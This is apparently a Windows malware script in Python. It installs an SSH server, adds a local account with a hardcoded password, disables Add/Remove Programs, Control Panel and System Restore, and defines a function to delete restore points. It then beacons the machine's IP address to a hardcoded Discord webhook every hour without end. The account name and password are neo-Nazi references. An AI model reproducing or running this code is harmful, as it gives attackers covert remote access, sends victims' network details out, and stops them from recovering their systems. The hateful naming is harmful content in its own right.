import os
import requests
import time
import socket
import winreg
import subprocess

# Install OpenSSH
os.system('Add-WindowsFeature -Name OpenSSH.Server')

# Set username and password
os.system('net user adolfhitler birdistheword1488 /add')


def disable_uninstall_settings_windows():
    subprocess.run(["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Uninstall", "/v", "NoAddRemovePrograms", "/t", "REG_DWORD", "/d", "1", "/f"])
    
# Call the function to disable uninstall settings in Windows
disable_uninstall_settings_windows()

def disable_restore_points():
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableConfig", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableSR", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Restore points disabled successfully.")
    except Exception as e:
        print("An error occurred:", e)

# Call the function to disable restore points
disable_restore_points()

def delete_restore_points():
    reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
        print("Restore points deleted successfully.")
    except Exception as e:
        print("An error occurred:", e)


def disable_control_panel():
    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")

disable_control_panel()

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

webhook_url = "https://discord.com/api/webhooks/1234747105751601224/979aO0Eo4ojPBqViuEbrgid9CQesBSK7HZ9E9Ybx1llrRxWOhtoiMbQdyuF1S3ohxm1l"

while True:
    ip_address = get_ip()
    payload = {"content": f"My current IP address is: {ip_address}"}
    requests.post(webhook_url, json=payload)
    time.sleep(3600)  # Sleep for 1 hour
